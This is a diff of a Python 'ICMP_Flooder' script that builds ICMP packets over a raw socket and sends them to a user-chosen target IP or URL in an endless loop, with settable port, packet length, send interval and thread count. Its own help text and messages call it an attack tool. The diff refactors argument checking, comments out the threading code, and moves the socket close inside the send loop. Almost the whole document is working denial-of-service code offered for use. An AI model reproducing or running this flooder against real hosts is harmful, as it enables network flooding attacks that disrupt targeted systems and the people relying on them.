@@ -1,19 +1,55 @@
-# FIX: can`t close opened threads
-
 import sys
 import time
-import string
 import struct
 import socket
 import argparse
 from threading import Thread, Event
 
+
+def log_print():
+    print("   ___ _                 _           \n" +
+          "  / __\ | ___   ___   __| | ___ _ __ \n" +
+          " / _\ | |/ _ \ / _ \ / _` |/ _ \ '__|\n" +
+          "/ /   | | (_) | (_) | (_| |  __/ |   \n" +
+          "\/    |_|\___/ \___/ \__,_|\___|_|   \n")
+
+
+def check_args(args):
+    if args.i: pass
+    elif args.u: args.i = socket.gethostbyname(args.u)
+    else: sys.stderr('Error. Address is not specified')
+
+    args.p = args.p if 0 < int(args.p) < 65530 else 80
+    args.l = args.l if args.l > 51 else 60
+    args.f = args.f if args.f > 0.1 else 0.1
+    args.t = args.t if args.t >= 0 else 1
+
+    print(f'Address: {args.i}\nPort: {args.p}\nLength: {args.l}\nFrequency: {args.f}\nThreads: {args.t}\n')
+
+
 class Flooder:
-    # Check data, calculated from the ICMP header and data
-    def checksum(self, msg):
+    def __init__(self, ip, port, length, freq, threads):
+        self.create_socket(ip, port, length, freq)
+        # event = Event()
+        # list_threads = []
+        # try:
+        #     for i in range(threads):
+        #         thread = Thread(target=self.create_socket(ip, port, length, freq))
+        #         thread.daemon = True
+        #         thread.start()
+        #         list_threads.append(thread)
+        # except KeyboardInterrupt:
+        #     event.set()
+        #     print('\t Stop open threads ...\n')
+        #     for thread in list_threads:
+        #         thread.join()
+        #     print('\t Attack has been stopped!!!\n')
+
+    @staticmethod
+    def checksum(msg):
         sum = 0
         for i in range(0, len(msg), 2):
-            w = ord(msg[i]) + (ord(msg[i+1]) << 8)
+            w = msg[i] + (msg[i + 1] << 8)
             sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
         return socket.htons(~sum & 0xffff)
 
@@ -31,80 +67,27 @@ class Flooder:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         socket.inet_aton(ip)
 
-        while(True):
+        while True:
             packet = self.construct_packet(length)
             sock.sendto(packet, (ip, port))
             time.sleep(freq)
-        
-        sock.close()
-        
-    def main(self, argv):
-        parser = argparse.ArgumentParser(prog="ICMP_Flooder", description="ICMP-packets flooder." +
-                " This programm creates and sends the ICMP-packets to target IP-address/URL" +
-                " address. You can change port number, length of packet and frequence of sending.\n",
-                epilog='Contact with me on "https://github.com/breadrock1" \n\n')
-        parser.add_argument('-i', help='Enter target ip address of destination', metavar='', type=str.format)
-        parser.add_argument('-u', help='Enter target url address', metavar='', type=str)
-        parser.add_argument('-p', help='Specify port number', metavar='', default=69, type=int)
-        parser.add_argument('-l', help='Specify packet length', metavar='', default=60, type =int)
-        parser.add_argument('-f', help='Specify value of frequence to send packet', metavar='', default=0.01, type=float)
-        parser.add_argument('-t', help='Count thread', metavar='', default=1, type=int)
-        args = parser.parse_args()
+            sock.close()
 
-        print("   ___ _                 _           \n" +
-                "  / __\ | ___   ___   __| | ___ _ __ \n" +
-                " / _\ | |/ _ \ / _ \ / _` |/ _ \ '__|\n" +
-                "/ /   | | (_) | (_) | (_| |  __/ |   \n" +
-                "\/    |_|\___/ \___/ \__,_|\___|_|   \n")
-
-        # Try to get ip address of destination (by url too)
-        if args.u:
-            url = args.u
-            ip_addr = socket.gethostbyname(url)
-            print("Specific Url: ", url)
-        if args.i:
-            ip_addr = args.i
-            print("Specific IP-Address: ", ip_addr)
-        
-        # Check for correct port number to send packet      
-        if int(args.p) > 0 and int(args.p) < 65530:
-            print("Specific port: ", int(args.p))
-        elif int(args.p) == 69:
-            print("Default port: ", int(args.p))
-        else:
-            print("No valid port number")
-            sys.exit()
-            
-        # Check for correct value of lenhgth of packet
-        if int(args.l) < 51:
-            print("Is too few length")
-            sys.exit()
-        elif int(args.l) == 60:
-            print("Default length: ", int(args.l))
-        else:
-            print("Specific length of packet: ", int(args.l))
-
-        # Check for correct value of frequency to send packets
-        if float(args.f) == 0.1:
-            print("Default times: ", float(args.f))
-        else:
-            print("Specific count: ", float(args.f))
-
-        try:
-            evnt = Event()
-            threads = []
-            for i in range(args.t):
-                thrd = Thread(target=self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f)))
-                thrd.daemon = True
-                thrd.start()
-                threads.append(thrd)
-        except KeyboardInterrupt:
-            evnt.set()
-            print('\t Stop open threads ...\n')
-            for thrd in threads:
-                thrd._stop()
-            print('\t Attack has been stopped!!!\n')
 
 if __name__ == "__main__":
-    flood = Flooder()
-    flood.main(sys.argv[1:])
+    log_print()
+    parser = argparse.ArgumentParser(prog="ICMP_Flooder", description="ICMP-packets flooder." +
+                                  " This programm creates and sends the ICMP-packets to target IP-address/URL" +
+                                  " address. You can change port number, length of packet and frequence of sending.\n",
+                                  epilog='Contact with me on "https://github.com/breadrock1" \n\n')
+    parser.add_argument('-i', help='Enter target ip address', metavar='', required=True, type=str)
+    parser.add_argument('-u', help='Enter target url address', metavar='', required=False, type=str)
+    parser.add_argument('-p', help='Specify the port number', metavar='', required=True, default=80, type=int)
+    parser.add_argument('-t', help='Specify number of threads', metavar='', required=False, default=1, type=int)
+    parser.add_argument('-l', help='Specify the packet length', metavar='', required=False, default=60, type=int)
+    parser.add_argument('-f', help='Specify value of frequents', metavar='', required=False, default=0.1, type=float)
+    arguments = parser.parse_args()
+
+    check_args(arguments)
+    flood = Flooder(arguments.i, arguments.p, arguments.l, arguments.f, arguments.t)
+
